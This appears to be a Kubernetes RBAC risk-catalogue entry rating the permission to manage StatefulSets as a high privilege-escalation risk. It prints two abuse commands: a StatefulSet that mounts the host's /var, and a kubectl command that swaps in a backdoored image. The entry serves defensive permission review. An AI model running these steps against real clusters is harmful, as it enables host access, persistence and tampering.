---
id: 1038
title: "Manage StatefulSets in a namespace"
description: "Allows creating, updating, or deleting StatefulSets within a specific namespace. This can be used to deploy stateful applications with potentially privileged settings, leading to potential privilege escalation, persistence, and tampering within that namespace."
category: Elevation of Privilege
risk_level: RiskLevelHigh
date: ""
---

## Overview

| Field                   | Value                                                                                                                        |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| ID                      | 1038                                                                                                                         |
| Name                    | Manage StatefulSets in a namespace                                                                                           |
| Risk Category           | Elevation of Privilege                                                                                                       |
| Risk Level              | {{< risk High >}}                                                                                                            |
| Role Type               | Role                                                                                                                         |
| API Groups              | apps                                                                                                                         |
| Resources               | statefulsets                                                                                                                 |
| Risky Verb Combinations | [create] · [update] · [patch] · [delete]                                                                                     |
| Tags                    | {{< tag "Persistence" >}} {{< tag "PotentialPrivilegeEscalation" >}} {{< tag "Tampering" >}} {{< tag "WorkloadLifecycle" >}} |

## Description

Allows creating, updating, or deleting StatefulSets within a specific namespace. This can be used to deploy stateful applications with potentially privileged settings, leading to potential privilege escalation, persistence, and tampering within that namespace.

## Abuse Scenarios

1. Create a new StatefulSet with a hostPath mount in the namespace.

```bash
kubectl create -n <namespace> -f - <<EOF
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: hostpath-statefulset
spec:
  serviceName: "hostpath-service"
  replicas: 1
  selector:
    matchLabels:
      app: hostpath-sts
  template:
    metadata:
      labels:
        app: hostpath-sts
    spec:
      containers:
      - name: hostpath-container
        image: busybox
        command: ["/bin/sh", "-c", "sleep infinity"]
        volumeMounts:
        - mountPath: /host-var
          name: host-var
      volumes:
      - name: host-var
        hostPath:
          path: /var
EOF
# Example: kubectl create -n default -f - <<EOF ... EOF

```

2. Update an existing StatefulSet's image to a malicious one.

```bash
kubectl set image statefulset/<statefulset-name> <container-name>=<malicious-image> -n <namespace>
# Example: kubectl set image statefulset/my-app-db db=attacker/db-backdoor -n production

```
